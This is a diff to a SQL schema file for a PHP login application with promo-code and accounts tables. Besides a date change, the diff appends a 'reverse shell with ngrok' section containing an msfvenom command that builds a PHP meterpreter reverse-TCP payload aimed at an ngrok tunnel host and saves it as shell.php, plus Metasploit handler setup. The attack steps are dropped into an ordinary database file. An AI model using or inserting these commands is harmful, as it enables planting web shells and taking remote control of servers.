@@ -36,7 +36,7 @@ CREATE TABLE IF NOT EXISTS promo_codes(
 
 -- Insert sample promo code
 INSERT INTO promo_codes (code, discount_percentage, valid_until, uses_left)
-VALUES ('SUMMER2024', 20, '2024-08-31', 1000);
+VALUES ('SUMMER2024', 20, '2024-12-31', 1000);
 
 -- USE DATABASE CALLED "phplogin"
 -- SQL for Accounts Table
@@ -49,3 +49,24 @@ CREATE TABLE IF NOT EXISTS `accounts` (
 ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
 
 INSERT INTO `accounts` (`id`, `username`, `password`, `email`) VALUES (1, 'test', '$2y$008c5926ca861023c1d2a36653fd88e2', 'test@test.com');
+
+
+
+------------------------------------------------------------- REVERSE SHELL WITH NGROK ---------------------------------------------------------------------------
+-- Start NGROK
+ngrok tcp 4444
+-- Copy the URL & PORT number
+-- Eg IP = 0.tcp.ap.ngrok.io PORT = 12419
+
+-- MSFVENOM Payload
+msfvenom -p php/meterpreter_reverse_tcp LHOST=0.tcp.ap.ngrok.io LPORT=12419 -f raw -o shell.php
+
+
+-- meterpreter
+use exploit/multi/handler
+set payload php/meterpreter_reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 4444
+run
+
+
